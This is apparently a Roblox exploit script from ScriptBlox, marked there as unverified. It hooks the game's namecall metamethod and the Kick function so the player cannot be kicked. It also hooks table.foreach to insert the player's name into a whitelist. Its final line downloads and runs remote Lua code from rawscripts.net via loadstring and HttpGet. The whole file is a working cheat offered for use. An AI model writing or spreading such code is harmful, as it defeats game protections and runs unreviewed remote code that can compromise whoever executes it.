--[[
 WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
local old;
old = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
 local method = getnamecallmethod()
 if method == "Kick" then
  return nil
 end
 return old(self, ...)
end))
hookfunction(game:GetService("Players").LocalPlayer.Kick, function()
 return nil
end)

local count = 0
local old;
old = hookfunction(table.foreach, function(self, callback)
 count += 1
 if count == 2 then
  table.insert(self, game.Players.LocalPlayer.Name)
 end
 return old(self, callback)
end)

loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Whitelist-Script-9649"))()